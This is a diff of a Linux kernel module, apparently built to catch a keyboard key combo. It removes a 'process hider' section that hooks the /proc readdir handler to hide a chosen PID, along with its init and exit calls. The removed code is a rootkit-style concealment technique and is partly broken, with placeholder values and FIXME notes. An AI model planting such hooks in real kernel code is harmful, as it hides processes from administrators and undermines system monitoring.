@@ -224,89 +224,6 @@ kb_irq_handler(int irq, void *arg)
 	return IRQ_HANDLED;
 }
 
-//*** Kernel process hider functions ***//
-// TODO: need to cite this
-
-#define TARGET_PID 0000
-
-typedef int (*read_iter_t)(struct kiocb*, void*, filldir_t);
-
-// For storing original readdir handler
-readdir_t orig_proc_readdir = NULL;
-
-// For storing original filldir struct
-filldir_t orig_proc_filldir = NULL;
-
-// atoi() function for kernel module
-int kernel_atoi(const char *str)
-{
-	int result = 0, radix = 1;
-	const char *tmpChar;
-
-	for (tmpChar = str; *tmpChar >= '0' && *tmpChar <= '9'; tmpChar++);
-	tmpChar--;
-	while (tmpChar >= str) {
-		if (*tmpChar < '0' || *tmpChar > '9')
-			break;
-		result += (*tmpChar - '0') * radix;
-		radix *= 10;
-		tmpChar--;
-	}
-	return result;
-}
-
-// Provides no filldir for target pid,
-//	provides original filldir otherwise
-int my_proc_filldir (void *buf, const char *name,
-				int nlen, loff_t off, ino_t ino, unsigned x)
-{
-	if (kernel_atoi(name) == TARGET_PID)	 {
-		return 0;
-	}
-	return orig_proc_filldir(buf, name, nlen, off, ino, x);
-}
-
-// Provides customized readdir handler
-int custom_proc_readdir(struct file *fp, void *buf, filldir_t filldir)
-{
-	orig_proc_filldir = filldir;
-	return orig_proc_readdir(fp, buf, my_proc_filldir);
-}
-
-// Kernel process hider initilization
-void hide_pid_init(readdir_t *orig_readdir, readdir_t new_readdir)
-{
-	struct file *filep;
-
-	if ((filep = filp_open("/proc", O_RDONLY, 0)) == NULL) {
-		return -1;
-	}
-	// Save original readdir
-	if (orig_readdir) {
-		// FIXME: readdir no longer exists
-		*orig_readdir = filep->f_op->readdir;
-	}
-	// FIXME: readdir no longer exists
-	filep->f_op->readdir = new_readdir;
-	filp_close(filep, 0);
-	return 0;
-}
-
-// Kernel process hider restore
-int hide_pid_restore(readdir_t orig_readdir)
-{
-	struct file *filep;
-
-	if ((filep = filp_open("/proc", O_RDONLY, 0)) == NULL) {
-		return -1;
-	}
-	// FIXME: readdir no longer exists
-	filep->f_op->readdir = orig_readdir;
-	filp_close(filep, 0);
-	return 0;
-}
-//*** End of kernel process hider functions ***//
-
 /* Module Setup */
 
 // Initialization of module
@@ -316,10 +233,6 @@ init_KonamiModule(void)
 	int error;
 
 	pr_debug("Konamo module initialized.\n");
-
-	// Kernel process hider
-	hide_pid_init(&orig_proc_readdir, custom_proc_readdir);
-
 	// Create a single-thread work queue to handle keyboard IRQs without blocking
 	wq_keyboard = create_singlethread_workqueue("KonamiKBCombo2018");
 	// Keyboard's IRQ on x86* is 1, using IRQF_SHARED doesn't block other
@@ -336,9 +249,6 @@ init_KonamiModule(void)
 void __exit
 exit_KonamiModule(void)
 {
-	// Revert process hiding
-	hide_pid_restore(orig_proc_readdir);
-	
 	// Process remaining items in keyboard IRQ handler queue and cleanup
 	flush_workqueue(wq_keyboard);
 	destroy_workqueue(wq_keyboard);
